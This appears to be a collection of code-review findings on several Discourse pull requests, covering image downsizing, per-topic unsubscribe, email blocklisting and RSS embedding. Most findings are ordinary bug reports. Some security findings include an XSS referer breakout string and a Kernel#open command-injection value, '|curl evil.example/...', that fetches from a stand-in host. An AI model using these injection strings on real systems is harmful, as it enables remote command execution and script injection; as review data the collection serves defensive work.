body: `FileHelper.download(url, 10.megabytes, ...)` replaces the previous cap of `SiteSetting.max_image_size_kb.kilobytes`. When an admin raises `max_image_size_kb` above 10MB (e.g. 50MB), the URL fetch path will now reject with a download error for any source between 10MB and the configured limit, even though the upload is supposed to be allowed and auto-downsized. Conversely, when the admin lowers `max_image_size_kb` to e.g. 1MB, the download limit is 10x the upload limit, which is intentional for downsizing but is not surfaced as a setting. The download cap should be a separate, larger setting (or derived as `max_image_size_kb * N`) rather than a hardcoded 10MB.

title: OptimizedImage.optimize arity changed from 6 to 5
body: `def self.optimize(operation, from, to, width, height, opts={})` (5 positional args + opts) is replaced by `def self.optimize(operation, from, to, dimensions, opts={})` (4 positional args + opts). Although this method is more internal than `downsize`, it is still a public class method, and any external caller (e.g. plugins or specs) passing separate width/height integers will now get those values joined as `"800600"` and passed to ImageMagick, which is silently wrong. The arity change should be paired with explicit deprecation or a new method name to avoid silent breakage.

title: Duplicate self.downsize method shadows earlier definition
body: Two class methods named self.downsize are defined back-to-back: one with signature (from, to, max_width, max_height, opts) on lines 145-147 and another with signature (from, to, dimensions, opts) on lines 149-151. In Ruby the second definition completely replaces the first; the four-arg overload becomes dead code that is never reachable. The unused definition is misleading and will silently break any other caller that still passes separate width/height integers (those calls would now misroute 200 into the opts hash and raise NoMethodError on opts[:allow_animation]). The dead method should be deleted so only the (from, to, dimensions, opts) form remains.

title: Passing '80%' to gifsicle --resize-fit will fail for animated GIFs
body: The controller calls OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", allow_animation: SiteSetting.allow_animated_thumbnails). The animated branch in resize_instructions_animated assembles `gifsicle <from> --colors=256 --resize-fit 80% --optimize=3 --output <to>`. gifsicle's --resize-fit expects pixel dimensions of the form WxH; it does not accept a percentage. When allow_animated_thumbnails is enabled and the uploaded image is a GIF, this command will either be rejected by gifsicle or produce no useful output, so the downsize loop's exit-condition (tempfile.size > SiteSetting.max_image_size_kb.kilobytes) will never become false and the GIF will be uploaded unmodified (and likely over the size limit).

title: Client-side file-size limit hardcoded to 10 MB and no longer uses SiteSettings
body: validateUploadedFile previously read `Discourse.SiteSettings['max_' + type + '_size_kb']` (and displayErrorForUpload read `SiteSettings.max_image_size_kb`). The PR replaces both with a hardcoded `10 * 1024`. The server-side controller still uses `SiteSetting.max_image_size_kb` (now with an auto-downsize step, but a server-enforced ceiling remains). This decouples client and server validation: an admin who lowers max_image_size_kb below 10 MB will see uploads rejected on the server with a generic 413, while the browser still claims files up to 10 MB are valid; raising max_image_size_kb above 10 MB will not relax the client-side cap. The previous site-setting based values should be restored, or the server limit should also be aligned with 10 MB.

title: Downsize loop does not verify the file is now within the size limit
body: The retry loop only checks `tempfile.size > SiteSetting.max_image_size_kb.kilobytes` before each iteration; if OptimizedImage.downsize returns false (e.g. convert/gifsicle fails, source is unsupported, or the file just can't be compressed enough at 80% scale for five attempts), the loop still exits with attempt reaching 0. The code then unconditionally calls Upload.create_for with `tempfile.size` and creates an Upload record whose underlying file exceeds SiteSetting.max_image_size_kb. There is no fallback to reject the upload, no log line, and the user gets no error. The loop should re-check size after the downsize call (e.g. re-stat the file) and treat remaining-oversize as an error returned to the caller.

title: NilTopicUser causes 500 error on unsubscribe
body: `tu = TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` can return nil for users who have never visited the topic (e.g. someone who only received the notification email). The very next line `tu.notification_level > ...` then raises `NoMethodError` on nil, producing a 500 instead of either muting the topic or returning a clean 404. The action needs to handle the nil case (e.g. create a TopicUser with the desired level, or short-circuit to a page that tells the user they have no subscription on this topic).

title: GET-based unsubscribe is CSRF-vulnerable; no per-user token
body: `unsubscribe` is exposed only via GET (config/routes.rb lines 440–441) and `skip_before_filter :check_xhr, only: [:show, :unsubscribe, :feed]`, and the action mutates state (`tu.save!`). Unlike the existing `email/unsubscribe/:key` route which uses a unique per-user key, this route authenticates only via the session cookie, so any third-party page or email can embed `` (or equivalent link) and, if the victim is logged in, silently mute them on arbitrary topics. At minimum, the action should require a one-time token (as the email-key route already does), or be POST-only with CSRF, to prevent drive-by topic muting.

title: Direct tu.save! skips TopicUser.change (race + no broadcast)
body: The action uses `TopicUser.find_by(...).save!` instead of `TopicUser.change(user_id, topic_id, notification_level: ...)`. `TopicUser.change` is the established entry point that (a) does an atomic upsert, (b) sets `notifications_changed_at`/`notifications_reason_id`, (c) broadcasts the change on MessageBus so other tabs/clients update, and (d) handles the `RecordNotUnique` race. Bypassing it means concurrent clicks can clobber each other, the notification reason metadata is never written, and live UIs do not refresh.

title: No rescue from Discourse::InvalidAccess on private/restricted topics
body: `TopicView.new(params[:topic_id], current_user)` will raise `Discourse::InvalidAccess` for topics the user can no longer see (e.g. removed from a PM, category access revoked). Unlike `show` (lines 88–95) which rescues `InvalidAccess` and removes notifications, `unsubscribe` lets the exception bubble, producing a 500. Users in this state should either get a clean 403/404 or have the action bail out before mutating any state. As written, a 500 is also raised if a brand-new user without a TopicUser row hits the page (the nil-`tu` bug), so the rescue is doubly needed.

title: Toggle semantics don't match UI copy
body: When the user is currently `tracking` or `watching` (notification_level > regular), the action sets the level to `regular` (1) rather than `muted` (0), and the template copy shown after the redirect is "You will stop receiving notifications for {{title}}." The user will in fact still receive regular notifications, contradicting the page they land on. Either drop straight to `muted` from any level, or change the copy and the I18n string to reflect that they are merely being downgraded.

title: Typo in property name: stopNotificiationsText
body: The controller defines `stopNotificiationsText` (double 'i') and the template `templates/topic/unsubscribe.hbs` references the same misspelled name. It works only because both sides are consistent, but it will confuse anyone reading the code. Rename to `stopNotificationsText` (and update the template) to match the I18n key `topic.unsubscribe.stop_notifications`.

title: Wrong tense in unsubscribe confirmation
body: The string `topic.unsubscribe.stop_notifications` reads "You will stop receiving notifications for {{title}}." but it is rendered after the controller has already performed the state change, so the tense is wrong. It should read "You have stopped receiving notifications..." (or similar) and should accurately reflect the resulting notification level (the controller can downgrade to `regular`, not always to `muted`).

title: No tests for unsubscribe_url in rendered email body
body: The PR adds `unsubscribe_url: "/t/1234/unsubscribe"` to the existing builder spec but never asserts that this URL appears in either the text body or the rendered html body. The new `unsubscribe_link` I18n string relies on `%{unsubscribe_url}` being substituted and PrettyText-cooked into an `<a>` tag — a regression there (e.g. forgetting to pass `unsubscribe_url` from another caller) would silently produce a broken `[click here]()` link in every notification email and would not be caught by the current spec.

title: No controller tests for TopicsController#unsubscribe
body: There are no specs covering the new `unsubscribe` action. At minimum the suite should cover: (1) nil `TopicUser` does not 500, (2) `tracking`/`watching` users get downgraded, (3) `regular` users get muted, (4) unauthorized topics (removed from PM) get a clean response rather than a 500, (5) MessageBus publish on `/topic/<id>` is emitted with `notification_level_change`. The state-changing logic and its edge cases are uncovered.

title: List-Unsubscribe header still points to user preferences only
body: The `List-Unsubscribe` header is hardcoded to `template_args[:user_preferences_url]` (line 107) even though `unsubscribe_url` is now available per-topic. Modern mail clients (Gmail, Apple Mail) honor `List-Unsubscribe: <url>` for one-click unsubscribe. Leaving it pointed at `/my/preferences` means users who want to silence a single topic have to click through two pages, undermining the purpose of this feature. The header should include (or prefer) the per-topic `unsubscribe_url` for notification emails.

title: TopicsController#unsubscribe crashes when TopicUser record is absent
body: `tu = TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` can return nil for a user who received a notification (e.g. was @-mentioned or quoted) but has never actually visited the topic, because TopicUser rows are only created on visit/track. The very next line then dereferences `tu.notification_level`, raising NoMethodError on nil and producing a 500 for those users right when they click the unsubscribe link in an email — exactly the users the feature is meant to serve. The controller should use TopicUser.change (which upserts), or explicitly check for nil and create the record with the new notification level.

title: List-Unsubscribe header still points at global preferences, not the per-topic URL
body: In `header_args`, the RFC8058 one-click `List-Unsubscribe` header is set to `template_args[:user_preferences_url]` even though `@opts[:unsubscribe_url]` (the new per-topic URL, which is the entire point of this PR) is now available and merged into `template_args`. Mail clients such as Gmail, Apple Mail and Outlook honor this header to render a one-click "Unsubscribe" button; users who click it will be sent to the global preferences page and effectively unsubscribed from all email, not just this topic. The header should use `template_args[:unsubscribe_url]` when present, so the standard one-click path matches the in-body link.

title: GET endpoint mutates a user's notification level with no CSRF protection or signed token
body: `TopicsController#unsubscribe` is wired as a GET route (`get "t/:slug/:topic_id/unsubscribe" => "topics#unsubscribe"`) and silently calls `tu.save!` to change the logged-in user's notification level. The `ensure_logged_in` filter only requires a session; it provides no CSRF defense, and there is no signed token in the URL analogous to the existing `email/unsubscribe/:key` mechanism. Any third-party site can embed `` and, when a logged-in Discourse user loads the page, their topic notification state is changed without consent. State-changing actions triggered from email should either use a signed, single-use key (as the global email unsubscribe already does) or be a POST guarded by a CSRF token / explicit confirmation step.

title: Toggle logic only mutes users already at regular; watching/tracking users keep getting emails
body: The branch `if tu.notification_level > TopicUser.notification_levels[:regular]` sets the level to `:regular` for users at `:tracking` or `:watching`, and only sets `:muted` for users already at `:regular` or `:muted`. With the notification levels enum (muted=0, regular=1, tracking=2, watching=3), a user who was watching the topic and clicks unsubscribe is downgraded to `regular`, which still produces email notifications for every reply. The user-visible text in `topic.unsubscribe.stop_notifications` says "You will stop receiving notifications", which is false for that common case. The action should either jump straight to `:muted` (matching the wording) or clearly document that the first click is a "reduce" and the second is a "mute".

title: Misspelled identifier `stopNotificiationsText`
body: The computed property is named `stopNotificiationsText` (three i's, 'Notificiations') in the controller, and the same misspelling is hard-coded in `app/assets/javascripts/discourse/templates/topic/unsubscribe.hbs` line 3 (`{{{stopNotificiationsText}}}`). It currently works because the two misspellings match, but any future search/rename for `stopNotificationsText` will miss this, and the misspelling will be baked into the public template API. The identifier should be corrected in both files (and the template updated) before this ships.

title: Test for List-Unsubscribe header only checks presence, not that the per-topic URL is used
body: The existing test `it "has an List-Unsubscribe header"` only asserts that the header is `be_present`, even though the new test setup now passes `unsubscribe_url: "/t/1234/unsubscribe"`. Because the assertion doesn't compare the header value, it would still pass if the header were (incorrectly) hard-coded to the global preferences URL. The test should assert that `header_args['List-Unsubscribe']` includes the per-topic `unsubscribe_url`, so the regression in `message_builder.rb#header_args` is caught.

title: NoMethodError when TopicUser record does not exist
body: The unsubscribe action does `tu = TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` and then unconditionally calls `tu.notification_level` and `tu.save!`. For any user who has not previously visited/read the topic (or whose topic_users row was deleted) there is no TopicUser row and `find_by` returns nil, so the first comparison raises NoMethodError on nil and the user sees a 500 instead of being unsubscribed. New users on a topic they have never opened will hit this on the very first click from the email. The action should use `TopicUser.find_or_create_by(...)` (or the existing `TopicUser.change` helper which already creates the row on miss) and otherwise guard against nil.

title: GET-based state change with no auth token enables CSRF unsubscribe
body: The unsubscribe endpoint is GET-only and the URL it generates (`{base}/t/{slug}/{id}/unsubscribe`) contains no per-user authentication token, unlike Discourse's other email-triggered endpoints (e.g. `email/unsubscribe/:key`, `users/password-reset/:token`, `users/activate-account/:token`). Any third-party site can force a logged-in Discourse user to be unsubscribed/muted from any topic simply by referencing the URL (e.g. as an ``, hidden link, or redirect). Once the user lands on it, `tu.save!` mutates their notification level with no confirm step. The action should either be POST/PUT (so Rails' CSRF token applies) or the link in the email should carry a signed/email-token like the existing global unsubscribe (`email#unsubscribe`) does.

title: No explicit guardian check before mutating state
body: Before doing `tu.save!` the controller relies on `TopicView.new` raising to deny access, but there is no explicit `guardian.ensure_can_see!(@topic_view.topic)` (or equivalent). If `TopicView.new` ever stops raising for some category/PM edge case, or if a later refactor changes that, the action will happily downgrade a TopicUser row for a topic the user is not entitled to interact with. Add an explicit guardian check (matching the pattern used by `clear_pin`/`re_pin`/`mute` in the same controller) before mutating user state.

title: mailing_list_notify omits unsubscribe_url, breaking the feature for mailing-list users
body: `send_notification_email` is shared between the per-user notification path and `mailing_list_notify`, but `mailing_list_notify` (lines 146-159) builds its opts hash without `unsubscribe_url:` while the other callers now pass `unsubscribe_url: post.topic.unsubscribe_url`. As a result users in mailing-list mode still get the old footer with only the global preferences link and no per-topic unsubscribe link, which is inconsistent with the stated goal of this PR and means the new i18n text "To stop receiving notifications about this particular topic, [click here](%{unsubscribe_url})" is never shown for these emails.

title: Misspelled property leaks to template handlebars
body: The CP is named `stopNotificiationsText` (extra 'i' after Notific). The template (`templates/topic/unsubscribe.hbs`) refers to it as `{{{stopNotificiationsText}}}` so it works, but the misspelling will bite anyone who tries to grep, rename, or reuse it, and Ember will warn about unknown handlebars bindings the moment either side is corrected. Rename to `stopNotificationsText` and update the template accordingly.

title: New unsubscribe behavior is not actually asserted
body: The diff only adds `unsubscribe_url: "/t/1234/unsubscribe"` to the existing `message_with_unsubscribe` let-block, but no expectation is added that this URL ends up in the rendered body. The "unsubscribe link" context only checks that the user preferences URL appears; there is no test asserting that `unsubscribe_url` is interpolated into the `unsubscribe_link` i18n key and surfaces in the body/html_part. Given the i18n string was changed and the unsubscribe_url plumbing is brand new, a regression here would silently produce emails with the global-preferences-only footer again.

title: No controller spec for the new unsubscribe action
body: There is no topics_controller_spec coverage for the new `unsubscribe` action: nil-TopicUser case, slug mismatch redirect, the regular->muted vs tracking/watching->regular branch, permission denial, and that the rendered view is `topics/show`. Combined with the silent `tu.save!` and the fact that this action is the entry point for every per-topic unsubscribe email, a regression here will only be caught in production.

title: Race condition causes lost match_count increments
body: BlockedEmail.should_block? does a read-modify-write on match_count (record.match_count += 1; record.save) without any locking. Two concurrent signup attempts with the same blocked email will each read the same match_count, both increment to N+1 in memory, and both persist N+1, losing one increment. Because this is invoked from the EmailValidator on the signup path, multiple simultaneous attempts to register with a blocked email will undercount the hits, breaking the audit/statistics this feature is built around. Use an atomic SQL update (e.g., BlockedEmail.where(id: record.id).update_all('match_count = match_count + 1, last_match_at = ?', Time.zone.now)) or wrap in a row-level lock / SELECT FOR UPDATE.

title: should_block? performs a DB write during read-only validation
body: should_block? is named like a predicate but has the side effect of incrementing match_count and updating last_match_at whenever a record exists. The EmailValidator (lib/validators/email_validator.rb) calls it on every email validation, including runs that ultimately fail to save the user. Consequences: (1) match_count gets incremented even when the signup ultimately fails for unrelated reasons, distorting statistics; (2) every blocked-email signup now performs an extra UPDATE on the blocked_emails table inside what should be a validation pass, increasing contention; (3) if record.save fails it is silently swallowed, leaving an inconsistent mix of "returned true because record existed" but with no recorded hit. The hit-recording logic should be split from the block check (e.g., a separate should_record_hit?) and only run on successful user creation, or at least on a successful save of the record.

title: Case-sensitive blocked-email lookup lets blocked addresses slip through
body: EmailValidator calls BlockedEmail.should_block?(value) with the raw, mixed-case value supplied by the user. BlockedEmail.where(email: email).first is case-sensitive, and the migration's add_index :blocked_emails, :email, unique: true is a plain btree unique index (not citext / functional lower(email) index). Existing flows normalize emails to lowercase in some places (e.g., users_controller#change_email uses Email.downcase), but neither the BlockedEmail model nor the validator does any normalization. An admin who adds 'Spammer@Evil.com' to the blocklist will not stop a signup from 'spammer@evil.com', 'SPAMMER@evil.com', etc. Worse, because the unique index is case-sensitive, you cannot even add both casings as separate rows. Normalize via before_validation (self.email = Email.downcase(self.email.to_s).strip) and either store lowercase + add a functional unique index, or use a citext column.

title: Unique index on email does not enforce case-insensitive uniqueness
body: add_index :blocked_emails, :email, unique: true uses the raw column values, so 'spam@x.com' and 'SPAM@x.com' are treated as distinct and both can be inserted. Combined with the case-sensitive lookup in BlockedEmail.should_block?, this is the underlying cause of the bypass above and also makes it impossible for admins to comprehensively block an address. Use a case-insensitive column (citext) or a functional index such as add_index :blocked_emails, 'lower(email)', unique: true, name: 'index_blocked_emails_on_lower_email'.

title: record.save failure is silently swallowed
body: should_block? calls record.save with no error handling. If the save raises or returns false (e.g., a validation error on the BlockedEmail record, a DB error, or an ActionView::Template::Error from a future before_save), the exception bubbles up out of the EmailValidator and aborts user signup. The user sees a generic 500 instead of a clean validation message. At minimum, wrap in a rescue and log; ideally restructure so hit recording is not coupled to the block decision (see the related side-effect finding).

title: rejectedEmails list never cleared and is case-sensitive
body: rejectedEmails is initialized once as Em.A([]) and only ever pushObject'd to. It is never cleared, and the contains(email) check is case-sensitive. Consequences: (1) once a controller instance flags an email as rejected, the user cannot clear that rejection (e.g., if they fix a typo and try the corrected address it's fine, but if they re-type the same address with different casing, e.g. 'Bad@Spam.com' vs 'bad@spam.com', the rejection check silently misses it because the case-sensitive contains returns false even though the server already rejected it); (2) the array grows without bound for the lifetime of the controller. The pushObject site should normalize the email (e.g., toLowerCase()) on both insert and check, and there should be a way to clear it on success/reset.

title: Blocked-email check runs even when whitelist/blacklist already rejected the email
body: The validator checks the whitelist/blacklist first and adds an error if appropriate, then separately calls BlockedEmail.should_block?(value). The condition guards with `if record.errors[attribute].blank?`, which is correct in isolation. But should_block? also has the side effect of doing a DB write (updating match_count/last_match_at) for the matched record. When a blocked email also trips the whitelist/blacklist (e.g., admin added both), match_count will still be incremented because the guard only checks the in-memory errors hash for the current validator, not the prior-pass state. That aside, the bigger concern is that should_block? runs an additional SELECT and potentially an UPDATE on the hot path of every signup even when the email was just rejected for whitelist/blacklist reasons. Restructure so should_block? is a pure read with no side effects, and do hit-recording only on successful user save.

title: Whitelist/blacklist branches of EmailValidator are untested
body: The only tests stub BlockedEmail.should_block? and never exercise the whitelist/blacklist code paths (SiteSetting.email_domains_whitelist / email_domains_blacklist). These paths were carried over verbatim from user.rb and were never tested before either, but now that the logic has been moved into a shared validator it's the right time to add coverage: an email rejected by the whitelist, an email rejected by the blacklist, and an email that passes both. Without tests, regressions in the gsub('.', '\.') / regexp interpolation (which is also unsafe if the setting contains regex metacharacters like '|' or '*') will slip in.

title: No test covers case-insensitive matching or the race condition
body: The model spec only exercises should_block? with an exact-case email and a single call. It does not cover (1) case-insensitive lookup, which is the main correctness gap of this PR (see EmailValidator finding), and (2) the lost-update race condition in match_count. At least one spec should demonstrate that 'Foo@Spam.com' blocks 'FOO@spam.com' (after the model is fixed), and a spec using threads or raw SQL should illustrate the concurrent-update behavior so the regression is caught if someone removes the atomic update later.

title: action_type not constrained to the Enum's values
body: validates :email, presence: true, uniqueness: true does not validate action_type, so the model will accept any integer (including ones not produced by BlockedEmail.actions). Add `validates :action_type, inclusion: { in: BlockedEmail.actions.values }` to fail fast on bad data. The `||=` in set_defaults only handles nil, not arbitrary invalid integers.

title: Missing trailing newline in email_validator.rb
body: The new file ends without a final newline (the diff explicitly notes "\ No newline at end of file"). Most Ruby tools, editors, and POSIX conventions expect source files to end with a newline. Add a trailing newline.

title: Domain setting interpolated directly into a regex
body: email_in_restriction_setting? builds the regex as Regexp.new("@(#{domains})", true). If the setting contains regex metacharacters other than '.' (e.g., '|', '*', '+', '(', '['), they are interpreted as regex syntax. This was carried over from the original user.rb implementation, but since the file is being touched anyway this is a good place to fix it: split the setting on commas/whitespace, Regexp.escape each entry, and join with '|'. Otherwise an admin who accidentally types 'foo.com|bar.com' (intending a list) silently changes the semantics.

title: Database write in validator without error handling
body: `BlockedEmail.should_block?` calls `record.save` without any rescue. It is invoked from `EmailValidator#validate_each`, which runs during `User#valid?` / `User#save`. If the save fails (e.g. DB connection blip, lock timeout, race causing a stale `match_count` that triggers a future validation), ActiveRecord raises and the user sees a generic 500 instead of a clean signup error. Validators should be side-effect free and idempotent; the counter increment belongs either in `update_all` (atomic, no exception on no-op) or in an `after_validation` / async job, not inside a validator that runs on every attribute check.

title: Blocked-email lookup is case- and whitespace-sensitive
body: `BlockedEmail.where(email: email).first` performs a literal equality match, and `BlockedEmail` neither downcases nor strips the email on save. The rest of the codebase treats email as case-insensitive (`User.find_by_username_or_email` downcases via `Email.downcase`, `users_controller#change_email` strips and downcases). A user can trivially bypass a block by signing up with `BAD@spamclub.com`, `bad@spamclub.com ` (trailing space), etc., and the same bypass defeats the admin's intent when they later look up rows in `blocked_emails`. Normalize the email (downcase + strip) on both write (`before_validation`) and read inside `should_block?`.

title: Lost-update race in match_count increment
body: `record.match_count += 1; record.save` is a read-modify-write on a single row with no row lock. Under any concurrent signups for the same blocked address (and Discourse runs Puma/clustered workers), two callers can both read e.g. `match_count = 5`, both bump to 6, and both persist 6 — losing one increment. The same problem affects `last_match_at`. Use an atomic SQL update, e.g. `BlockedEmail.where(id: record.id).update_all(["match_count = match_count + 1, last_match_at = ?", Time.zone.now])`, so the counter cannot be lost.

title: Regex metacharacters in domain setting are not escaped
body: `email_in_restriction_setting?` only does `setting.gsub('.', '\.')` before building `Regexp.new("@(#{domains})", true)`. The whitelist/blacklist values are admin-controlled site settings that may contain `|`, `(`, `)`, `[`, `]`, `+`, `*`, `?`, `^`, `$`, `\`. A value like `gmail.com|mail.ru` would match `@gmail.com` *or* `@mail.ru` (the first `|` makes `mail.ru` a separate alternative of the whole group, not a literal). Also, because the pattern is `@(...)` with no anchors, a blacklist value of `mail.ru` already matches `user@mail.ru.example.com`. Escape all regex metacharacters and anchor the match (e.g. require the domain to end at a non-word character or end of string) so neither false positives nor ReDoS-via-admin-setting is possible.

title: EmailValidator spec does not exercise whitelist/blacklist paths
body: The spec only covers the `BlockedEmail.should_block?` branch via Mocha stubs. The whitelist and blacklist branches (the original purpose of `email_validator`, moved out of `User`) are completely untested. Without covering those, a regression that, say, swaps the `if`/`elsif` to make blacklist override whitelist, or one that breaks the regex escape, would pass tests. Add at least one case each for: (a) whitelist present, email not in whitelist -> error added, (b) whitelist present, email in whitelist -> no error, (c) blacklist present, email in blacklist -> error added, (d) blacklist present, email not in blacklist -> no error, and (e) error from whitelist suppresses the BlockedEmail branch.

title: Race condition in BlockedEmail.should_block?
body: `should_block?` uses a non-atomic read-modify-write to update `match_count` and `last_match_at`. Two concurrent validations can both read the same `match_count`, both increment it in memory, and the second `save` overwrites the first, silently losing increments and clobbering `last_match_at`. Under any real sign-up load (the very load this PR is trying to throttle), statistics for blocked emails will be wrong. Use an atomic update, e.g. `BlockedEmail.where(id: record.id).update_all('match_count = match_count + 1, last_match_at = ?', Time.zone.now)`, and skip callbacks/validations.

title: record.save runs validations/callbacks for a counter update
body: Calling `record.save` triggers the full ActiveRecord lifecycle (validations including `uniqueness`, callbacks) every time an email is checked, just to bump a counter. If a uniqueness race loses, the in-memory `record` is still returned as truthy in `should_block?`, so the user is blocked while the match counter was never persisted, and the exception is silently swallowed. For pure-statistic writes, use `update_columns`/`update_all` so the outcome isn't tied to a `save` succeeding.

title: Blocked email is not case-normalized; admin and signup inputs must match exactly
body: Both the model and the migration store `email` verbatim (case-sensitive unique index). The new validator compares it case-sensitively, and User#email is set from `params[:email]` without `Email.downcase`, so `Bad@Spam.com` (admin entry) and `bad@spam.com` (signup) are treated as different addresses. A blocklist entry that looks correct in the admin UI can be bypassed by submitting the same address with different casing, or with surrounding whitespace. Normalize via `before_validation` (e.g. `self.email = Email.downcase(email.to_s.strip)`) and consider a case-insensitive index so this can't be bypassed.

title: rejectedEmails.contains is case-sensitive, allowing easy bypass of client-side block
body: `this.get('rejectedEmails').contains(email)` does a strict string compare. After the server rejects `Bad@Spam.com`, that exact string is pushed. The user can then re-enter `bad@spam.com` (or add a space); the client validation passes, they resubmit, and only then learn from the server it's blocked. The UX promise of this PR — instant feedback for blocked emails — is broken. Normalize both sides (e.g. `email.toLowerCase()`) before pushing into `rejectedEmails` and before the contains check.

title: Whitelist/blacklist paths were moved from User but have no test coverage
body: The EmailValidator now owns the entire domain whitelist/blacklist logic that previously lived in `User#email_validator`, but the spec only covers the BlockedEmail branch. A regression in the regex construction (e.g. `setting.gsub('.', '\.')` with a comma-separated list — currently `@(gmail\.com,foo\.bar)`, which only matches the literal string `gmail.com,foo.bar`, not either domain) would not be caught. Add specs covering: whitelist allows/disallows, blacklist allows/disallows, comma-separated domains, interaction with BlockedEmail (whitelist fail vs block list), and that `record.errors[:email]` contains the expected key.

title: Email validation does a DB write on every blocked-email hit
body: `BlockedEmail.should_block?` is invoked from `validate_each`, which runs on every user save when the email changes. Each call performs a SELECT plus an UPDATE to track statistics. That makes a previously pure read-side validation write to the DB and, combined with the read-modify-write race above, turns user signup into a small thundering herd against `blocked_emails`. Consider tracking match stats out-of-band (background job, or only when not blocked by the domain check), or at minimum batching the write.

title: Migration default makes every existing post raw_html
body: The migration adds the `cook_method` column with `default: 1` and `null: false`. Given `Post.cook_methods = Enum.new(:regular, :raw_html)` is 0-indexed (the convention used by Discourse's `Enum`), `1` is `:raw_html`. That means after the migration runs, every existing post row has `cook_method == :raw_html`, so `Post#cook` (`return raw if cook_method == Post.cook_methods[:raw_html]` in `app/models/post.rb`) returns the raw column verbatim and the entire cooking pipeline (markdown rendering, oneboxing, link rewriting, sanitisation, plugin post-cook filters) is bypassed for every legacy post. The default should be `0` (`:regular`); only the RSS import path explicitly sets the column to `Post.cook_methods[:raw_html]`. Without this fix, the first time any post is revised it will save `cooked = raw` and silently corrupt the rendered HTML for the whole forum.

title: Unescaped request.referer interpolated into JavaScript string
body: The line `parent.postMessage({...}, '<%= request.referer %>');` inserts the raw `request.referer` value into a JavaScript string literal. The controller's `ensure_embeddable` filter only checks `URI(request.referer || '').host != SiteSetting.embeddable_host`, which validates only the host portion, not the path or query string. An attacker who controls any path/query on the embeddable host (e.g. a user-controlled redirect, search parameter echo, or a path segment) can provide a referer such as `https://example.com/');alert(document.domain);//` that passes validation and breaks out of the string at render time, producing stored XSS inside the embed iframe. The referer must be HTML- and JavaScript-escaped before being interpolated, or (better) the embeddable host should be passed as a validated server-side constant (or post to `'*'` with a strict origin check on the parent listener) instead of trusting the raw header.

title: Imported RSS/HTML bypasses sanitisation via raw_html cook_method
body: `TopicEmbed.import` always creates the post with `cook_method: Post.cook_methods[:raw_html]` and `skip_validations: true`. `Post#cook` then returns `raw` unchanged, and the embed view renders it with `<%= raw post.cooked %>` (see `app/views/embed/best.html.erb` line 19). The `Readability::Document` call in `import_remote` only whitelists tags/attributes — it does not strip `javascript:` URLs nor `on*` event handlers, and the `absolutize_urls` rewrite only acts on `href`/`src` that start with `/`. As a result, content fetched from an attacker-controlled URL can contain `` or `` that survives into the rendered embed iframe. The combination of raw_html + direct `raw` rendering in the embed view means any URL the admin (or attacker who triggers an import) submits becomes an XSS payload served from the Discourse origin inside the embedder's frame.

title: Kernel#open on user-controlled URL enables shell injection and SSRF
body: `rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)` uses Ruby's `Kernel#open`, which calls `Kernel#system` when the argument starts with `|`. A site administrator able to influence `feed_polling_url`, or any data source that ends up feeding it, could pass a string like `|curl evil.example/x|https://attacker/feed` to execute arbitrary commands on the host.
